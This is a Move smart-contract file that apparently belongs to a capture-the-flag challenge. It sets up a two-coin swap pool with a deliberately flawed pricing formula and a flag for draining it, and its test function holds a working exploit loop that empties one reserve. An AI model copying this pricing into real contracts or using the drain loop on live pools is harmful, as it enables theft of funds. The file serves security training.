module ctfmovement::pool {
    use std::signer;

    use aptos_framework::event::{Self, EventHandle};
    use aptos_framework::account;
    use aptos_framework::managed_coin;
    use aptos_framework::coin::{Self, Coin};

    struct Coin1 has store {}
    struct Coin2 has store {}

    struct LiquidityPool has key, store {
        coin1_reserve: Coin<Coin1>,
        coin2_reserve: Coin<Coin2>,
        flag_event_handle: EventHandle<Flag>
    }

    struct Faucet has key, store {
        coin1_reserve: Coin<Coin1>,
        coin2_reserve: Coin<Coin2>,
    }

    struct Flag has store, drop {
        user: address,
        flag: bool
    }

    fun init_module(swap_admin: &signer) {
        let swap_admin_addr = signer::address_of(swap_admin);
        assert!(swap_admin_addr == @ctfmovement, 0);

        managed_coin::initialize<Coin1>(swap_admin, b"Coin1", b"Coin1", 8, true);
        managed_coin::register<Coin1>(swap_admin);
        managed_coin::mint<Coin1>(swap_admin, swap_admin_addr, 55);

        managed_coin::initialize<Coin2>(swap_admin, b"Coin2", b"Coin2", 8, true);
        managed_coin::register<Coin2>(swap_admin);
        managed_coin::mint<Coin2>(swap_admin, swap_admin_addr, 55);

        let coin1 = coin::withdraw<Coin1>(swap_admin, 50);
        let coin2 = coin::withdraw<Coin2>(swap_admin, 50);

        move_to(swap_admin, LiquidityPool {
            coin1_reserve: coin1,
            coin2_reserve: coin2,
            flag_event_handle: account::new_event_handle<Flag>(swap_admin)
        });

        let coin1 = coin::withdraw<Coin1>(swap_admin, 5);
        let coin2 = coin::withdraw<Coin2>(swap_admin, 5);

        move_to(swap_admin, Faucet {
            coin1_reserve: coin1,
            coin2_reserve: coin2,
        });
    }

    entry public fun get_coin(account: &signer) acquires Faucet{
        let faucet = borrow_global_mut<Faucet>(@ctfmovement);
        let addr = signer::address_of(account);

        let coin1 = coin::extract<Coin1>(&mut faucet.coin1_reserve, 5);
        let coin2 = coin::extract<Coin2>(&mut faucet.coin2_reserve, 5);

        coin::register<Coin1>(account);
        coin::register<Coin2>(account);

        coin::deposit<Coin1>(addr, coin1);
        coin::deposit<Coin2>(addr, coin2);
    }

    public fun get_amounts(pool: &LiquidityPool): (u64, u64) {
        (
            coin::value(&pool.coin1_reserve),
            coin::value(&pool.coin2_reserve),
        )
    }

    public fun get_amouts_out(pool: &LiquidityPool, amount: u64, order: bool): u64 {
        let (token1, token2) = get_amounts(pool);
        if (order) {
            return (amount * token2) / token1
        }else {
            return (amount * token1) / token2
        }
    }
    public fun swap_12(
        coin_in: &mut Coin<Coin1>,
        amount: u64,
        ): Coin<Coin2> acquires LiquidityPool {

        let coin_in_value = coin::value(coin_in);
        assert!(coin_in_value >= amount, 0);
        let pool = borrow_global_mut<LiquidityPool>(@ctfmovement);
        let amount_out = get_amouts_out(pool ,amount, true);

        let coin_extract = coin::extract(coin_in, amount);

        coin::merge(&mut pool.coin1_reserve, coin_extract);

        coin::extract(&mut pool.coin2_reserve, amount_out)
    }

    // swap token2 to token1
    public fun swap_21(
        coin_in: &mut Coin<Coin2>,
        amount: u64,
        ): Coin<Coin1> acquires LiquidityPool {

        let coin_in_value = coin::value(coin_in);
        assert!(coin_in_value >= amount, 0);
        let pool = borrow_global_mut<LiquidityPool>(@ctfmovement);
        let amount_out = get_amouts_out(pool ,amount, false);

        let coin_extract = coin::extract(coin_in, amount);

        coin::merge(&mut pool.coin2_reserve, coin_extract);

        coin::extract(&mut pool.coin1_reserve, amount_out)
    }

    // check whether you can get the flag
    public entry fun get_flag(account: &signer) acquires LiquidityPool {
        let pool = borrow_global_mut<LiquidityPool>(@ctfmovement);
        let c1 = coin::value(&pool.coin1_reserve);
        let c2 = coin::value(&pool.coin2_reserve);

        assert!(c1 == 0 || c2 == 0, 0);
        event::emit_event(&mut pool.flag_event_handle, Flag {
                user: signer::address_of(account),
                flag: true
        })
    }

    public fun dev_swap_12(dev: &signer, amount: u64) acquires LiquidityPool {
        let coin_in = coin::withdraw<Coin1>(dev, amount);
        let coin_out = swap_12(&mut coin_in, amount);
        coin::destroy_zero(coin_in);
        coin::deposit<Coin2>(signer::address_of(dev), coin_out);
    }

    public fun dev_swap_21(dev: &signer, amount: u64) acquires LiquidityPool {
        let coin_in = coin::withdraw<Coin2>(dev, amount);
        let coin_out = swap_21(&mut coin_in, amount);
        coin::destroy_zero(coin_in);
        coin::deposit<Coin1>(signer::address_of(dev), coin_out);
    }

    #[test(swap_admin=@ctfmovement, dev=@0x123)]
    fun test_catch_the_flag(
        swap_admin: &signer,
        dev: &signer,
    ) acquires LiquidityPool, Faucet {
        use std::debug;
        let dev_addr = signer::address_of(dev);
        account::create_account_for_test(@ctfmovement);
        account::create_account_for_test(dev_addr);
        init_module(swap_admin);
        get_coin(dev);

        let if_not_empty = true;
        while (if_not_empty) {
            let liquidity_pool = borrow_global<LiquidityPool>(@ctfmovement);
            let (coin1_reserve, coin2_reserve) = get_amounts(liquidity_pool);
            if (coin1_reserve < coin2_reserve) {
                let coin1_balance = coin::balance<Coin1>(dev_addr);
                let coin_in_amount = if (coin1_balance >= coin1_reserve) {
                    if_not_empty = false;
                    coin1_reserve
                } else {
                    coin1_balance
                };
                let coin_in = coin::withdraw<Coin1>(dev, coin_in_amount);
                // debug::print(&12);
                debug::print(&coin::value(&coin_in));
                let coin_out = swap_12(&mut coin_in, coin_in_amount);
                coin::destroy_zero(coin_in);
                coin::deposit(dev_addr, coin_out);
            } else {
                let coin2_balance = coin::balance<Coin2>(dev_addr);
                let coin_in_amount = if (coin2_balance >= coin2_reserve) {
                    if_not_empty = false;
                    coin2_reserve
                } else {
                    coin2_balance
                };
                let coin_in = coin::withdraw<Coin2>(dev, coin_in_amount);
                // debug::print(&21);
                debug::print(&coin::value(&coin_in));
                let coin_out = swap_21(&mut coin_in, coin_in_amount);
                coin::destroy_zero(coin_in);
                coin::deposit(dev_addr, coin_out);
            }
        };
        get_flag(dev);
        let liquidity_pool = borrow_global<LiquidityPool>(@ctfmovement); 
        assert!(
            event::counter(&liquidity_pool.flag_event_handle) == 1,
            101,
        );
    }
}
